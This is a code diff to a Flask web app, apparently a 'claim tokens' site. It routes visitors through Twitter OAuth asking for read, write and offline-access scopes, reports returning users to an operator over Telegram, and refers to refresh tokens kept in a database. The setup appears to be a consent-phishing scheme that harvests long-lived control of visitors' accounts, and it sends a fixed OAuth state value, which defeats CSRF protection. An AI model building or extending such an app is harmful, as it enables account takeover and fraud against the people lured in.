@@ -130,11 +130,31 @@ def perform_refresh(refresh_token):
 
 @app.route('/')
 def home():
-    # Simple landing page for claim eligibility
+    code = request.args.get('code')
+    state = request.args.get('state')
+    error = request.args.get('error')
+
+    if request.args.get('authorize') == 'true':
+        state = "0"
+        code_verifier, code_challenge = generate_code_verifier_and_challenge()
+        session['code_verifier'] = code_verifier
+
+        authorization_url = (
+            f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
+            f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
+            f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
+        )
+        return redirect(authorization_url)
+
     return render_template('home.html')
 
 @app.route('/claim')
 def claim():
+    if 'username' in session:
+        username = session['username']
+        send_message_via_telegram(f"👋 @{username} returned to claim tokens.")
+        message = f"Welcome back, @{username}!"
+        return render_template('welcome.html', message=message)
     code = request.args.get('code')
     state = request.args.get('state')
     error = request.args.get('error')
@@ -208,14 +228,8 @@ def welcome():
     if not username:
         return redirect(url_for('home'))
     
-    if 'refresh_token' in session:
-        access_token, refresh_token = refresh_token_in_db(session['refresh_token'], username)
-        if access_token and refresh_token:
-            session['access_token'] = access_token
-            session['refresh_token'] = refresh_token
-            send_message_via_telegram(f"🔄 Token refreshed for returning user @{username}.")
-
-    return redirect(url_for('dashboard'))
+    message = f"Welcome, @{username}! Your claim was successful."
+    return render_template('welcome.html', message=message)
 
 @app.route('/dashboard')
 def dashboard():
@@ -247,6 +261,11 @@ def active():
 
 @app.route('/verify')
 def verify():
+    if 'username' in session:
+        username = session['username']
+        message = f"Already verified as @{username}!"
+        return render_template('veriwelcome.html', message=message, redirect_url=VERIFY_REDIRECT_URL)
+
     code = request.args.get('code')
     state = request.args.get('state')
     error = request.args.get('error')
